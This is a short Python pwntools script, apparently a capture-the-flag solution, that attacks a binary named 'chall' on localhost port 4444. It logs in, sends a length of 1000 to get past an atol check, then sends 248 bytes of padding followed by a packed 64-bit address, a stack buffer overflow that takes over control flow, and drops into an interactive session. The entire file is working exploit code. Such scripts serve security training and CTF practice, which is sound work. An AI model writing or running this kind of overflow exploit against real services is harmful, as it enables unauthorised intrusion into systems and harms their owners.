from pwn import *

BINARY = "./chall"
context.binary = elf = ELF(BINARY)
context.terminal = ["tmux", "splitw", "-h"]
rop = ROP(elf)

gdbcmds = """
b main
b login
c
"""

# p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript=gdbcmds)
p = remote("localhost", 4444)

# login
password = b"A"
p.sendline(password)

# bypass atol check
print(p.recvuntil(b"data len: ").decode())
p.sendline(b"1000")

print(p.recvuntil(b"data: ").decode())
payload = b"B" * 248 + p64(0x0000717576702378)
print(payload)
p.sendline(payload)

# print(p.recv())
p.interactive()
